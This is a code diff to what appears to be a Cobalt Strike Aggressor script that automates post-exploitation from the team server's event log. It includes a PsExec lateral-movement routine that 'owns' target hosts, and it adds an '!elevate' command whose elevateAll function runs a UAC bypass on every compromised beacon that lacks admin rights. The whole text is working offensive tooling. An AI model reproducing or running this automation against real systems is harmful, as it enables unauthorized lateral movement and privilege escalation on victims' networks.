@@ -5,11 +5,28 @@
 # - List beacons by ID
 # - List listeners
 # - PsExec from the event log
+# - Automatically bypass UAC
 
+# PsExec against $target from $bid
+# TODO figure out how to use with make_token
 sub psexecTarget {
     ($bid, $target, $listener) = @_; # @_ contains the arguments for the subroutine.
     say("Owning $target with psexec_psh.");
     bpsexec_psh($bid, $target, $listener);
+}
+
+# Attempt to bypass UAC on all non-admin shells
+sub elevateAll {
+    $listener = $1;
+
+    foreach $b (beacons()) {
+        $bid = $b['id'];
+
+        if (!-isadmin $bid) {
+            say("Attempting to upgrade beacon $bid");
+            bbypassuac($bid, $listener);
+        }
+    }
 }
 
 on event_join {
@@ -55,6 +72,12 @@ on event_public {
 
                 psexecTarget($bid, $target, $listener);
             }
+        }
+        # Elevate all non-admin beacons
+        else if ($cmd eq "!elevate") {
+            $listener = @args[0];
+
+            elevateAll($listener);
         }
     }
 }
